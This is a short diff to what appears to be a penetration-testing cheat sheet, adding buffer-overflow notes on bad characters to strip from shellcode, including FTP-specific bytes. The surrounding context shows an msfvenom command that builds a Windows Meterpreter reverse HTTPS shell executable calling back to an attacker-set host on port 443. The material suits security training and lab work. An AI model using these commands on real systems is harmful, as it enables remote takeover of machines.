@@ -838,6 +838,10 @@ Buffer Overflow
     -   Create a PE Reverse HTTPS shell  
         msfvenom -p windows/meterpreter/reverse\_https LHOST=$ip
         LPORT=443 -f exe -o met\_https\_reverse.exe
+	
+    -   You can remove \x00\x0a\x0d\x20 almost in every app.
+    
+    -	FTP - > \x00\x0d\x0a\x20\x40
 
 Shells
 ===================================================================================================================================
